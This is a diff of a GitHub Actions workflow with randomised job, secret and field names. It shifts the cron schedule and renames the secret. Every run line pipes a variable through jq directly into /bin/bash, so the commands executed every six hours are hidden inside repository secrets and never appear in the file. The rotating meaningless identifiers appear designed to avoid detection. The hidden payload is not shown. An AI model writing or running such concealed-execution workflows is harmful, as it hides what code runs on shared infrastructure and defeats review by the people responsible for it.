@@ -1,9 +1,9 @@
 name: yidongping8761
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 0/6 * * *'
+    - cron: '35 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: yidongping8761
         env:
-          gfhd855: ${{ secrets.gfhd855 }}
+          wedy5261: ${{ secrets.wedy5261 }}
         run: |
-          echo $gfhd855 | jq -r .xdi0214 | /bin/bash
-          echo $e60 | jq -r .a1389 | /bin/bash
-          echo $cagzt2722 | jq -r .wt9 | /bin/bash
-          echo $kbm436 | jq -r .ppj17517 | /bin/bash
-          echo $le1 | jq -r .w1569 | /bin/bash
-          echo $nmx95151 | jq -r .mqavf3766 | /bin/bash
-          echo $rzv1337 | jq -r .rsnhl24 | /bin/bash
-          echo $gl5 | jq -r .f13884 | /bin/bash
+          echo $wedy5261 | jq -r .dfeyp5009 | /bin/bash
+          echo $nuiw689 | jq -r .wgpxk83579 | /bin/bash
+          echo $jygz97 | jq -r .e7728 | /bin/bash
+          echo $s9 | jq -r .duupz1447 | /bin/bash
+          echo $ua0125 | jq -r .cu234 | /bin/bash
+          echo $uq51302 | jq -r .afy784 | /bin/bash
+          echo $lcu84337 | jq -r .jwgys57907 | /bin/bash
+          echo $am883 | jq -r .v43412 | /bin/bash
+          echo $a84581 | jq -r .wr0459 | /bin/bash
 
